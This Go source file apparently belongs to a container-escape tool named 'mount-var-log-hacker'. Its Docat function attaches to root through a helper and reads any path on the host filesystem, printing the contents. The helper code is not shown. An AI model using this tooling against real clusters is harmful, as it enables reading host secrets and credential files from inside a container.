package logcat

import (
	"fmt"
	"io"
	"os"

	"github.com/awslshadowstar/mount-var-log-hacker/pkg/logutil"
)

func DocatWrapper(path string) error {
	result, err := Docat(path)
	if err != nil {
		return err
	}
	defer result.Close()
	io.Copy(os.Stdout, result)
	return nil
}

func Docat(path string) (io.ReadCloser, error) {
	if path[len(path)-1] == '/' {

		return nil, fmt.Errorf("error: %s is a directory", path)
	}
	logutil.AttachToRoot()
	defer logutil.DetachFromRoot()

	return logutil.DoRequest(logutil.HOST_FS_BASE + path)
}
